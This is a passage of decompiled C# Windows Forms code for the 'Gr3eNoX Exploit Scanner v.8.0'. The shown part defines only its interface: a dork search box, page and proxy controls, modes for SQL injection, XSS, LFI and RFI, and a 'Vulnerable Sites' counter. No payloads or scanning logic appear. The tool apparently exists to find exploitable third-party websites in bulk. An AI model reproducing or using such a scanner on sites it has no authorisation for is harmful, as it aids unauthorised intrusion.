//Type: Gr3eNoX_Exploit_Scanner_V80._0.My.MyProject
// Assembly: Gr3eNoX Exploit Scanner V8.0, Version=8.0.0.0, Culture=neutral, PublicKeyToken=null

using Gr3eNoX_Exploit_Scanner_V80._0.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace Gr3eNoX_Exploit_Scanner_V80._0
{
  [DesignerGenerated]
  public class scanner : Form
  {
    private IContainer components;
    [AccessedThroughProperty("sqlerrlist")]
    private ListBox _sqlerrlist;
    [AccessedThroughProperty("ProgressBar1")]
    private ProgressBar _ProgressBar1;
    [AccessedThroughProperty("StatusStrip1")]
    private StatusStrip _StatusStrip1;
    [AccessedThroughProperty("ToolStripStatusLabel1")]
    private ToolStripStatusLabel _ToolStripStatusLabel1;
    [AccessedThroughProperty("sf")]
    private ToolStripStatusLabel _sf;
    [AccessedThroughProperty("ToolStripStatusLabel2")]
    private ToolStripStatusLabel _ToolStripStatusLabel2;
    [AccessedThroughProperty("sc")]
    private ToolStripStatusLabel _sc;
    [AccessedThroughProperty("ToolStripStatusLabel3")]
    private ToolStripStatusLabel _ToolStripStatusLabel3;
    [AccessedThroughProperty("fs")]
    private ToolStripStatusLabel _fs;
    [AccessedThroughProperty("ToolStripStatusLabel5")]
    private ToolStripStatusLabel _ToolStripStatusLabel5;
    [AccessedThroughProperty("vsasd")]
    private ToolStripStatusLabel _vsasd;
    [AccessedThroughProperty("vs")]
    private ToolStripStatusLabel _vs;
    [AccessedThroughProperty("GroupBox2")]
    private GroupBox _GroupBox2;
    [AccessedThroughProperty("rfi")]
    private RadioButton _rfi;
    [AccessedThroughProperty("lfifuzz")]
    private RadioButton _lfifuzz;
    [AccessedThroughProperty("xss")]
    private RadioButton _xss;
    [AccessedThroughProperty("lfi")]
    private RadioButton _lfi;
    [AccessedThroughProperty("fsqli")]
    private RadioButton _fsqli;
    [AccessedThroughProperty("ssqli")]
    private RadioButton _ssqli;
    [AccessedThroughProperty("GroupBox1")]
    private GroupBox _GroupBox1;
    [AccessedThroughProperty("fuzzlist")]
    private ListBox _fuzzlist;
    [AccessedThroughProperty("pages")]
    private ComboBox _pages;
    [AccessedThroughProperty("clearb")]
    private Button _clearb;
    [AccessedThroughProperty("dorkbox")]
    private TextBox _dorkbox;
    [AccessedThroughProperty("clear2b")]
    private Button _clear2b;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("cloneb")]
    private Button _cloneb;
    [AccessedThroughProperty("Label2")]
    private Label _Label2;
    [AccessedThroughProperty("loadb")]
    private Button _loadb;
    [AccessedThroughProperty("searchb")]
    private Button _searchb;
    [AccessedThroughProperty("stopb")]
    private Button _stopb;
    [AccessedThroughProperty("stop2b")]
    private Button _stop2b;
    [AccessedThroughProperty("startb")]
    private Button _startb;
    [AccessedThroughProperty("domainbox")]
    private TextBox _domainbox;
    [AccessedThroughProperty("saveb")]
    private Button _saveb;
    [AccessedThroughProperty("domain")]
    private CheckBox _domain;
    [AccessedThroughProperty("SplitContainer1")]
    private SplitContainer _SplitContainer1;
    [AccessedThroughProperty("chklist")]
    private ListBox _chklist;
    [AccessedThroughProperty("chkdlist")]
    private ListBox _chkdlist;
    [AccessedThroughProperty("ContextMenuStrip1")]
    private ContextMenuStrip _ContextMenuStrip1;
    [AccessedThroughProperty("ToolStripMenuItem1")]
    private ToolStripMenuItem _ToolStripMenuItem1;
    [AccessedThroughProperty("PictureBox1")]
    private PictureBox _PictureBox1;
    [AccessedThroughProperty("loader")]
    private OpenFileDialog _loader;
    [AccessedThroughProperty("saver")]
    private SaveFileDialog _saver;
    [AccessedThroughProperty("dorkscanner")]
    private BackgroundWorker _dorkscanner;
    [AccessedThroughProperty("scnr")]
    private BackgroundWorker _scnr;
    [AccessedThroughProperty("proxyb")]
    private Button _proxyb;
    private int pg;
    private string dork;
    private string dom;

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (scanner));
      this.sqlerrlist = new ListBox();
      this.ProgressBar1 = new ProgressBar();
      this.StatusStrip1 = new StatusStrip();
      this.ToolStripStatusLabel1 = new ToolStripStatusLabel();
      this.sf = new ToolStripStatusLabel();
      this.ToolStripStatusLabel2 = new ToolStripStatusLabel();
      this.sc = new ToolStripStatusLabel();
      this.ToolStripStatusLabel3 = new ToolStripStatusLabel();
      this.fs = new ToolStripStatusLabel();
      this.ToolStripStatusLabel5 = new ToolStripStatusLabel();
      this.vsasd = new ToolStripStatusLabel();
      this.vs = new ToolStripStatusLabel();
      this.GroupBox2 = new GroupBox();
      this.ssqli = new RadioButton();
      this.fsqli = new RadioButton();
      this.xss = new RadioButton();
      this.lfi = new RadioButton();
      this.lfifuzz = new RadioButton();
      this.rfi = new RadioButton();
      this.GroupBox1 = new GroupBox();
      this.startb = new Button();
      this.domainbox = new TextBox();
      this.saveb = new Button();
      this.domain = new CheckBox();
      this.stop2b = new Button();
      this.searchb = new Button();
      this.stopb = new Button();
      this.loadb = new Button();
      this.clearb = new Button();
      this.dorkbox = new TextBox();
      this.clear2b = new Button();
      this.Label1 = new Label();
      this.proxyb = new Button();
      this.cloneb = new Button();
      this.Label2 = new Label();
      this.pages = new ComboBox();
      this.fuzzlist = new ListBox();
      this.SplitContainer1 = new SplitContainer();
      this.chklist = new ListBox();
      this.chkdlist = new ListBox();
      this.ContextMenuStrip1 = new ContextMenuStrip(this.components);
      this.ToolStripMenuItem1 = new ToolStripMenuItem();
      this.PictureBox1 = new PictureBox();
      this.loader = new OpenFileDialog();
      this.saver = new SaveFileDialog();
      this.dorkscanner = new BackgroundWorker();
      this.scnr = new BackgroundWorker();
      this.StatusStrip1.SuspendLayout();
      this.GroupBox2.SuspendLayout();
      this.GroupBox1.SuspendLayout();
      this.SplitContainer1.BeginInit();
      this.SplitContainer1.Panel1.SuspendLayout();
      this.SplitContainer1.Panel2.SuspendLayout();
      this.SplitContainer1.SuspendLayout();
      this.ContextMenuStrip1.SuspendLayout();
      ((ISupportInitialize) this.PictureBox1).BeginInit();
      this.SuspendLayout();
      this.sqlerrlist.FormattingEnabled = true;
      ListBox sqlerrlist1 = this.sqlerrlist;
      Point point1 = new Point(9, 131);
      Point point2 = point1;
      sqlerrlist1.Location = point2;
      this.sqlerrlist.Name = "sqlerrlist";
      ListBox sqlerrlist2 = this.sqlerrlist;
      Size size1 = new Size(15, 4);
      Size size2 = size1;
      sqlerrlist2.Size = size2;
      this.sqlerrlist.TabIndex = 0;
      this.sqlerrlist.Visible = false;
      this.ProgressBar1.Anchor = AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      ProgressBar progressBar1_1 = this.ProgressBar1;
      point1 = new Point(7, 548);
      Point point3 = point1;
      progressBar1_1.Location = point3;
      this.ProgressBar1.Name = "ProgressBar1";
      ProgressBar progressBar1_2 = this.ProgressBar1;
      size1 = new Size(888, 13);
      Size size3 = size1;
      progressBar1_2.Size = size3;
      this.ProgressBar1.TabIndex = 1;
      this.StatusStrip1.Items.AddRange(new ToolStripItem[9]
      {
        (ToolStripItem) this.ToolStripStatusLabel1,
        (ToolStripItem) this.sf,
        (ToolStripItem) this.ToolStripStatusLabel2,
        (ToolStripItem) this.sc,
        (ToolStripItem) this.ToolStripStatusLabel3,
        (ToolStripItem) this.fs,
        (ToolStripItem) this.ToolStripStatusLabel5,
        (ToolStripItem) this.vsasd,
        (ToolStripItem) this.vs
      });
      StatusStrip statusStrip1_1 = this.StatusStrip1;
      point1 = new Point(0, 565);
      Point point4 = point1;
      statusStrip1_1.Location = point4;
      this.StatusStrip1.Name = "StatusStrip1";
      StatusStrip statusStrip1_2 = this.StatusStrip1;
      size1 = new Size(901, 22);
      Size size4 = size1;
      statusStrip1_2.Size = size4;
      this.StatusStrip1.SizingGrip = false;
      this.StatusStrip1.TabIndex = 2;
      this.StatusStrip1.Text = "StatusStrip1";
      this.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1";
      ToolStripStatusLabel stripStatusLabel1 = this.ToolStripStatusLabel1;
      size1 = new Size(107, 17);
      Size size5 = size1;
      stripStatusLabel1.Size = size5;
      this.ToolStripStatusLabel1.Text = "Sites For Checking:";
      this.sf.ForeColor = Color.Blue;
      this.sf.Name = "sf";
      ToolStripStatusLabel sf = this.sf;
      size1 = new Size(13, 17);
      Size size6 = size1;
      sf.Size = size6;
      this.sf.Text = "0";
      this.ToolStripStatusLabel2.Name = "ToolStripStatusLabel2";
      ToolStripStatusLabel stripStatusLabel2 = this.ToolStripStatusLabel2;
      size1 = new Size(83, 17);
      Size size7 = size1;
      stripStatusLabel2.Size = size7;
      this.ToolStripStatusLabel2.Text = "Sites Checked:";
      this.sc.ForeColor = Color.Lime;
      this.sc.Name = "sc";
      ToolStripStatusLabel sc = this.sc;
      size1 = new Size(13, 17);
      Size size8 = size1;
      sc.Size = size8;
      this.sc.Text = "0";
      this.ToolStripStatusLabel3.Name = "ToolStripStatusLabel3";
      ToolStripStatusLabel stripStatusLabel3 = this.ToolStripStatusLabel3;
      size1 = new Size(11, 17);
      Size size9 = size1;
      stripStatusLabel3.Size = size9;
      this.ToolStripStatusLabel3.Text = "(";
      this.fs.ForeColor = Color.Silver;
      this.fs.Name = "fs";
      ToolStripStatusLabel fs = this.fs;
      size1 = new Size(13, 17);
      Size size10 = size1;
      fs.Size = size10;
      this.fs.Text = "0";
      this.ToolStripStatusLabel5.Name = "ToolStripStatusLabel5";
      ToolStripStatusLabel stripStatusLabel5 = this.ToolStripStatusLabel5;
      size1 = new Size(11, 17);
      Size size11 = size1;
      stripStatusLabel5.Size = size11;
      this.ToolStripStatusLabel5.Text = ")";
      this.vsasd.Name = "vsasd";
      ToolStripStatusLabel vsasd = this.vsasd;
      size1 = new Size(93, 17);
      Size size12 = size1;
      vsasd.Size = size12;
      this.vsasd.Text = "Vulnerable Sites:";
      this.vs.ForeColor = Color.Red;
      this.vs.Name = "vs";
      ToolStripStatusLabel vs = this.vs;
      size1 = new Size(13, 17);
      Size size13 = size1;
      vs.Size = size13;
      this.vs.Text = "0";
      this.GroupBox2.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
      this.GroupBox2.Controls.Add((Control) this.ssqli);
      this.GroupBox2.Controls.Add((Control) this.fsqli);
      this.GroupBox2.Controls.Add((Control) this.xss);
      this.GroupBox2.Controls.Add((Control) this.lfi);
      this.GroupBox2.Controls.Add((Control) this.lfifuzz);
      this.GroupBox2.Controls.Add((Control) this.rfi);
      GroupBox groupBox2_1 = this.GroupBox2;
      point1 = new Point(6, 205);
      Point point5 = point1;
      groupBox2_1.Location = point5;
      this.GroupBox2.Name = "GroupBox2";
      GroupBox groupBox2_2 = this.GroupBox2;
      size1 = new Size(885, 35);
      Size size14 = size1;
      groupBox2_2.Size = size14;
      this.GroupBox2.TabIndex = 3;
      this.GroupBox2.TabStop = false;
      this.ssqli.Anchor = AnchorStyles.Top;
      this.ssqli.AutoSize = true;
      this.ssqli.Checked = true;
      RadioButton ssqli1 = this.ssqli;
      point1 = new Point(52, 12);
      Point point6 = point1;
      ssqli1.Location = point6;
      this.ssqli.Name = "ssqli";
      RadioButton ssqli2 = this.ssqli;
      size1 = new Size(82, 17);
      Size size15 = size1;
      ssqli2.Size = size15;
      this.ssqli.TabIndex = 5;
      this.ssqli.TabStop = true;
      this.ssqli.Text = "Simple SQLi";
      this.ssqli.UseVisualStyleBackColor = true;
      this.fsqli.Anchor = AnchorStyles.Top;
      this.fsqli.AutoSize = true;
      this.fsqli.Enabled = false;
      RadioButton fsqli1 = this.fsqli;
      point1 = new Point(219, 12);
      Point point7 = point1;
      fsqli1.Location = point7;
      this.fsqli.Name = "fsqli";
      RadioButton fsqli2 = this.fsqli;
      size1 = new Size(84, 17);
      Size size16 = size1;
      fsqli2.Size = size16;
      this.fsqli.TabIndex = 4;
      this.fsqli.TabStop = true;
      this.fsqli.Text = "Forced SQLi";
      this.fsqli.UseVisualStyleBackColor = true;
      this.xss.Anchor = AnchorStyles.Top;
      this.xss.AutoSize = true;
      RadioButton xss1 = this.xss;
      point1 = new Point(388, 12);
      Point point8 = point1;
      xss1.Location = point8;
      this.xss.Name = "xss";
      RadioButton xss2 = this.xss;
      size1 = new Size(46, 17);
      Size size17 = size1;
      xss2.Size = size17;
      this.xss.TabIndex = 3;
      this.xss.TabStop = true;
      this.xss.Text = "XSS";
      this.xss.UseVisualStyleBackColor = true;
      this.lfi.AutoSize = true;
      RadioButton lfi1 = this.lfi;
      point1 = new Point(519, 12);
      Point point9 = point1;
      lfi1.Location = point9;
      this.lfi.Name = "lfi";
      RadioButton lfi2 = this.lfi;
      size1 = new Size(40, 17);
      Size size18 = size1;
      lfi2.Size = size18;
      this.lfi.TabIndex = 2;
      this.lfi.TabStop = true;
      this.lfi.Text = "LFI";
      this.lfi.UseVisualStyleBackColor = true;
      this.lfifuzz.Anchor = AnchorStyles.Top;
      this.lfifuzz.AutoSize = true;
      RadioButton lfifuzz1 = this.lfifuzz;
      
      point1 = new Point(644, 12);
      Point point10 = point1;
      lfifuzz1.Location = point10;
      this.lfifuzz.Name = "lfifuzz";
      RadioButton lfifuzz2 = this.lfifuzz;
      size1 = new Size(65, 17);
      Size size19 = size1;
      lfifuzz2.Size = size19;
      this.lfifuzz.TabIndex = 1;
      this.lfifuzz.TabStop = true;
      this.lfifuzz.Text = "LFI Fuzz";
      this.lfifuzz.UseVisualStyleBackColor = true;
      
      this.rfi.Anchor = AnchorStyles.Top;
      this.rfi.AutoSize = true;
      RadioButton rfi1 = this.rfi;
      point1 = new Point(794, 12);
      Point point11 = point1;
      rfi1.Location = point11;
      this.rfi.Name = "rfi";
      RadioButton rfi2 = this.rfi;
      size1 = new Size(42, 17);
      Size size20 = size1;
      rfi2.Size = size20;
      this.rfi.TabIndex = 0;
      this.rfi.Text = "RFI";
      this.rfi.UseVisualStyleBackColor = true;
      this.GroupBox1.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
      this.GroupBox1.Controls.Add((Control) this.startb);
      this.GroupBox1.Controls.Add((Control) this.domainbox);
      this.GroupBox1.Controls.Add((Control) this.saveb);
      this.GroupBox1.Controls.Add((Control) this.domain);
      this.GroupBox1.Controls.Add((Control) this.searchb);
      this.GroupBox1.Controls.Add((Control) this.stopb);
      this.GroupBox1.Controls.Add((Control) this.loadb);
      this.GroupBox1.Controls.Add((Control) this.clearb);
      this.GroupBox1.Controls.Add((Control) this.dorkbox);
      this.GroupBox1.Controls.Add((Control) this.Label1);
      this.GroupBox1.Controls.Add((Control) this.proxyb);
      this.GroupBox1.Controls.Add((Control) this.cloneb);
      this.GroupBox1.Controls.Add((Control) this.Label2);
      this.GroupBox1.Controls.Add((Control) this.pages);
      this.GroupBox1.Controls.Add((Control) this.fuzzlist);
      GroupBox groupBox1_1 = this.GroupBox1;
      point1 = new Point(6, 131);
      Point point12 = point1;
      groupBox1_1.Location = point12;
      this.GroupBox1.Name = "GroupBox1";
      GroupBox groupBox1_2 = this.GroupBox1;
      size1 = new Size(885, 73);
      Size size21 = size1;
      groupBox1_2.Size = size21;
      this.GroupBox1.TabIndex = 4;
      this.GroupBox1.TabStop = false;
      this.startb.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.startb.FlatStyle = FlatStyle.Flat;
      Button startb1 = this.startb;
      point1 = new Point(390, 41);
      Point point13 = point1;
      startb1.Location = point13;
      this.startb.Name = "startb";
      Button startb2 = this.startb;
      size1 = new Size(116, 23);
      Size size22 = size1;
      startb2.Size = size22;
      this.startb.TabIndex = 16;
      this.startb.Text = "Start";
      this.startb.UseVisualStyleBackColor = true;
      this.domainbox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
      this.domainbox.Enabled = false;
      TextBox domainbox1 = this.domainbox;
      point1 = new Point(142, 40);
      Point point14 = point1;
      domainbox1.Location = point14;
      this.domainbox.Name = "domainbox";
      TextBox domainbox2 = this.domainbox;
      size1 = new Size(126, 20);
      Size size23 = size1;
      domainbox2.Size = size23;
      this.domainbox.TabIndex = 15;
      this.saveb.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.saveb.FlatStyle = FlatStyle.Flat;
      Button saveb1 = this.saveb;
      point1 = new Point(512, 41);
      Point point15 = point1;
      saveb1.Location = point15;
      this.saveb.Name = "saveb";
      Button saveb2 = this.saveb;
      size1 = new Size(116, 23);
      Size size24 = size1;
      saveb2.Size = size24;
      this.saveb.TabIndex = 14;
      this.saveb.Text = "Save To File";
      this.saveb.UseVisualStyleBackColor = true;
      this.domain.AutoSize = true;
      CheckBox domain1 = this.domain;
      point1 = new Point(15, 43);
      Point point16 = point1;
      domain1.Location = point16;
      this.domain.Name = "domain";
      CheckBox domain2 = this.domain;
      size1 = new Size(125, 17);
      Size size25 = size1;
      domain2.Size = size25;
      this.domain.TabIndex = 13;
      this.domain.Text = "Use Custom Domain:";
      this.domain.UseVisualStyleBackColor = true;
      
      
      this.searchb.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.searchb.FlatStyle = FlatStyle.Flat;
      Button searchb1 = this.searchb;
      point1 = new Point(390, 13);
      Point point18 = point1;
      searchb1.Location = point18;
      this.searchb.Name = "searchb";
      Button searchb2 = this.searchb;
      size1 = new Size(66, 23);
      Size size27 = size1;
      searchb2.Size = size27;
      this.searchb.TabIndex = 11;
      this.searchb.Text = "Search";
      this.searchb.UseVisualStyleBackColor = true;
      this.stopb.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.stopb.FlatStyle = FlatStyle.Flat;
      Button stopb1 = this.stopb;
      point1 = new Point(756, 13);
      Point point19 = point1;
      stopb1.Location = point19;
      this.stopb.Name = "stopb";
      Button stopb2 = this.stopb;
      size1 = new Size(53, 23);
      Size size28 = size1;
      stopb2.Size = size28;
      this.stopb.TabIndex = 10;
      this.stopb.Text = "Stop";
      this.stopb.UseVisualStyleBackColor = true;
      this.loadb.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.loadb.FlatStyle = FlatStyle.Flat;
      Button loadb1 = this.loadb;
      point1 = new Point(462, 13);
      Point point20 = point1;
      loadb1.Location = point20;
      this.loadb.Name = "loadb";
      Button loadb2 = this.loadb;
      size1 = new Size(88, 23);
      Size size29 = size1;
      loadb2.Size = size29;
      this.loadb.TabIndex = 9;
      this.loadb.Text = "Load From File";
      this.loadb.UseVisualStyleBackColor = true;
      // Clear button 
      this.clearb.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.clearb.FlatStyle = FlatStyle.Flat;
      Button clearb1 = this.clearb;
      point1 = new Point(815, 13);
      Point point21 = point1;
      clearb1.Location = point21;
      this.clearb.Name = "clearb";
      Button clearb2 = this.clearb;
      size1 = new Size(57, 23);
      Size size30 = size1;
      clearb2.Size = size30;
      this.clearb.TabIndex = 8;
      this.clearb.Text = "Clear";
      this.clearb.UseVisualStyleBackColor = true;
      
      // Dorkbox 
      this.dorkbox.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
      TextBox dorkbox1 = this.dorkbox;
      point1 = new Point(46, 13);
      Point point22 = point1;
      dorkbox1.Location = point22;
      this.dorkbox.Name = "dorkbox";
      TextBox dorkbox2 = this.dorkbox;
      size1 = new Size(319, 20);
      Size size31 = size1;
      dorkbox2.Size = size31;
      this.dorkbox.TabIndex = 7;

      
      this.Label1.AutoSize = true;
      Label label1_1 = this.Label1;
      point1 = new Point(12, 16);
      Point point24 = point1;
      label1_1.Location = point24;
      this.Label1.Name = "Label1";
      Label label1_2 = this.Label1;
      size1 = new Size(33, 13);
      Size size33 = size1;
      label1_2.Size = size33;
      this.Label1.TabIndex = 5;
      this.Label1.Text = "Dork:";
      this.proxyb.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.proxyb.FlatStyle = FlatStyle.Flat;
      Button proxyb1 = this.proxyb;
      point1 = new Point(556, 13);
      Point point25 = point1;
      proxyb1.Location = point25;
      this.proxyb.Name = "proxyb";
      Button proxyb2 = this.proxyb;
      size1 = new Size(88, 23);
      Size size34 = size1;
      proxyb2.Size = size34;
      this.proxyb.TabIndex = 4;
      this.proxyb.Text = "Lista-Dorks";
      this.proxyb.UseVisualStyleBackColor = true;
      this.cloneb.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.cloneb.Enabled = false;
      this.cloneb.FlatStyle = FlatStyle.Flat;
      Button cloneb1 = this.cloneb;
      point1 = new Point(650, 12);
      Point point26 = point1;
      cloneb1.Location = point26;
      this.cloneb.Name = "cloneb";
      Button cloneb2 = this.cloneb;
      size1 = new Size(100, 23);
      Size size35 = size1;
      cloneb2.Size = size35;
      this.cloneb.TabIndex = 3;
      this.cloneb.Text = "Remove Clones";
      this.cloneb.UseVisualStyleBackColor = true;
      this.Label2.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.Label2.AutoSize = true;
      Label label2_1 = this.Label2;
      point1 = new Point(274, 45);
      Point point27 = point1;
      label2_1.Location = point27;
      this.Label2.Name = "Label2";
      Label label2_2 = this.Label2;
      size1 = new Size(40, 13);
      Size size36 = size1;
      label2_2.Size = size36;
      this.Label2.TabIndex = 2;
      this.Label2.Text = "Pages:";
      this.pages.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.pages.FormattingEnabled = true;
      this.pages.Items.AddRange(new object[5]
      {
        (object) "1",
        (object) "2",
        (object) "3",
        (object) "4",
        (object) "5"
      });
      ComboBox pages1 = this.pages;
      point1 = new Point(320, 41);
      Point point28 = point1;
      pages1.Location = point28;
      this.pages.Name = "pages";
      ComboBox pages2 = this.pages;
      size1 = new Size(44, 21);
      Size size37 = size1;
      pages2.Size = size37;
      this.pages.TabIndex = 1;
      this.pages.Text = "1";
      this.fuzzlist.FormattingEnabled = true;
      ListBox fuzzlist1 = this.fuzzlist;
      point1 = new Point(32, 0);
      Point point29 = point1;
      fuzzlist1.Location = point29;
      this.fuzzlist.Name = "fuzzlist";
      ListBox fuzzlist2 = this.fuzzlist;
      size1 = new Size(13, 4);
      Size size38 = size1;
      fuzzlist2.Size = size38;
      this.fuzzlist.TabIndex = 0;
      this.fuzzlist.Visible = false;
      this.SplitContainer1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      SplitContainer splitContainer1_1 = this.SplitContainer1;
      point1 = new Point(9, 246);
      Point point30 = point1;
      splitContainer1_1.Location = point30;
      this.SplitContainer1.Name = "SplitContainer1";
      this.SplitContainer1.Panel1.Controls.Add((Control) this.chklist);
      this.SplitContainer1.Panel2.Controls.Add((Control) this.chkdlist);
      SplitContainer splitContainer1_2 = this.SplitContainer1;
      size1 = new Size(882, 299);
      Size size39 = size1;
      splitContainer1_2.Size = size39;
      this.SplitContainer1.SplitterDistance = 434;
      this.SplitContainer1.TabIndex = 5;
      this.chklist.Dock = DockStyle.Fill;
      this.chklist.FormattingEnabled = true;
      ListBox chklist1 = this.chklist;
      point1 = new Point(0, 0);
      Point point31 = point1;
      chklist1.Location = point31;
      this.chklist.Name = "chklist";
      ListBox chklist2 = this.chklist;
      size1 = new Size(434, 299);
      Size size40 = size1;
      chklist2.Size = size40;
      this.chklist.TabIndex = 0;
      this.chkdlist.ContextMenuStrip = this.ContextMenuStrip1;
      this.chkdlist.Dock = DockStyle.Fill;
      this.chkdlist.FormattingEnabled = true;
      ListBox chkdlist1 = this.chkdlist;
      point1 = new Point(0, 0);
      Point point32 = point1;
      chkdlist1.Location = point32;
      this.chkdlist.Name = "chkdlist";
      ListBox chkdlist2 = this.chkdlist;
      size1 = new Size(444, 299);
      Size size41 = size1;
      chkdlist2.Size = size41;
      this.chkdlist.TabIndex = 0;
      this.ContextMenuStrip1.Items.AddRange(new ToolStripItem[1]
      {
        (ToolStripItem) this.ToolStripMenuItem1
      });
      this.ContextMenuStrip1.Name = "ContextMenuStrip1";
      ContextMenuStrip contextMenuStrip1 = this.ContextMenuStrip1;
      size1 = new Size(103, 26);
      Size size42 = size1;
      contextMenuStrip1.Size = size42;
      this.ToolStripMenuItem1.Name = "ToolStripMenuItem1";
      ToolStripMenuItem toolStripMenuItem1 = this.ToolStripMenuItem1;
      size1 = new Size(102, 22);
      Size size43 = size1;
      toolStripMenuItem1.Size = size43;
      this.ToolStripMenuItem1.Text = "Copy";
      this.PictureBox1.BorderStyle = BorderStyle.Fixed3D;
      this.PictureBox1.Dock = DockStyle.Top;
      this.PictureBox1.Image = (Image) componentResourceManager.GetObject("PictureBox1.Image");
      PictureBox pictureBox1_1 = this.PictureBox1;
      point1 = new Point(0, 0);
      Point point33 = point1;
      pictureBox1_1.Location = point33;
      this.PictureBox1.Name = "PictureBox1";
      PictureBox pictureBox1_2 = this.PictureBox1;
      size1 = new Size(901, 125);
      Size size44 = size1;
      pictureBox1_2.Size = size44;
      this.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.PictureBox1.TabIndex = 7;
      this.PictureBox1.TabStop = false;
      this.loader.FileName = "Select a file";
      this.loader.Filter = "Txt files|*.txt|All files|*.*";
      this.saver.FileName = "Gr3eNoX";
      this.saver.Filter = "Txt files|*.txt|All files|*.*";
      this.dorkscanner.WorkerSupportsCancellation = true;
      this.scnr.WorkerSupportsCancellation = true;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(901, 587);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.PictureBox1);
      this.Controls.Add((Control) this.SplitContainer1);
      this.Controls.Add((Control) this.GroupBox1);
      this.Controls.Add((Control) this.GroupBox2);
      this.Controls.Add((Control) this.StatusStrip1);
      this.Controls.Add((Control) this.ProgressBar1);
      this.Controls.Add((Control) this.sqlerrlist);
      this.FormBorderStyle = FormBorderStyle.FixedSingle;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (scanner);
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Gr3eNoX Exploit Scanner v.8.0";
      this.StatusStrip1.ResumeLayout(false);
      this.StatusStrip1.PerformLayout();
      this.GroupBox2.ResumeLayout(false);
      this.GroupBox2.PerformLayout();
      this.GroupBox1.ResumeLayout(false);
      this.GroupBox1.PerformLayout();
      this.SplitContainer1.Panel1.ResumeLayout(false);
      this.SplitContainer1.Panel2.ResumeLayout(false);
      this.SplitContainer1.EndInit();
      this.SplitContainer1.ResumeLayout(false);
      this.ContextMenuStrip1.ResumeLayout(false);
      ((ISupportInitialize) this.PictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual ListBox sqlerrlist
    {
      get => this._sqlerrlist;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._sqlerrlist = value;
    }

    internal virtual ProgressBar ProgressBar1
    {
      get => this._ProgressBar1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ProgressBar1 = value;
    }

    internal virtual StatusStrip StatusStrip1
    {
      get => this._StatusStrip1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._StatusStrip1 = value;
    }

    internal virtual ToolStripStatusLabel ToolStripStatusLabel1
    {
      get => this._ToolStripStatusLabel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ToolStripStatusLabel1 = value;
    }

    internal virtual ToolStripStatusLabel sf
    {
      get => this._sf;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._sf = value;
    }

    internal virtual ToolStripStatusLabel ToolStripStatusLabel2
    {
      get => this._ToolStripStatusLabel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ToolStripStatusLabel2 = value;
    }

    internal virtual ToolStripStatusLabel sc
    {
      get => this._sc;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._sc = value;
    }

    internal virtual ToolStripStatusLabel ToolStripStatusLabel3
    {
      get => this._ToolStripStatusLabel3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ToolStripStatusLabel3 = value;
    }

    internal virtual ToolStripStatusLabel fs
    {
      get => this._fs;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._fs = value;
    }

    internal virtual ToolStripStatusLabel ToolStripStatusLabel5
    {
      get => this._ToolStripStatusLabel5;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ToolStripStatusLabel5 = value;
    }

    internal virtual ToolStripStatusLabel vsasd
    {
      get => this._vsasd;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._vsasd = value;
    }

    internal virtual ToolStripStatusLabel vs
    {
      get => this._vs;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._vs = value;
    }

    internal virtual GroupBox GroupBox2
    {
      get => this._GroupBox2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._GroupBox2 = value;
    }

    internal virtual RadioButton rfi
    {
      get => this._rfi;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._rfi = value;
    }

    internal virtual RadioButton lfifuzz
    {
      get => this._lfifuzz;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._lfifuzz = value;
    }

    internal virtual RadioButton xss
    {
      get => this._xss;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._xss = value;
    }

    internal virtual RadioButton lfi
    {
      get => this._lfi;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._lfi = value;
